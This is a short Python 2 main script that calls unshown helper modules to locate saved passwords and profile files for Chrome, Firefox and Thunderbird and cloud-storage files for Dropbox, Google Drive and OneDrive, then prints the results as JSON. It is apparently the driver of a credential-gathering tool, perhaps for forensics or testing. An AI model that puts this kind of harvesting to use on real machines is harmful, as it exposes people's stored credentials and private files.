#!/usr/bin/python


####
### Main script
##
#
##
###
####

import cloud, browserfile, config, packetizer
import os, subprocess

def main():
	# find passwords and browser files
	chrome = browserfile.chromeFinder()
	ffList = browserfile.firefoxFinder()
	thList = browserfile.thunderbirdFinder()

	# find cloud files
	dropboxList = cloud.dropbox()

	if config.OP_SYS == "Windows":
		gdriveList = cloud.gdrive()
		onedriveList = cloud.onedrive()

	#pack all together

	print "\n\n====== JSON Formatted Values ======="
	packetizer.browserPack(chrome, "Chrome")
	packetizer.browserPack(ffList, "Firefox")
	packetizer.browserPack(thList, "Thunderbird")

if __name__ == "__main__":
	main()
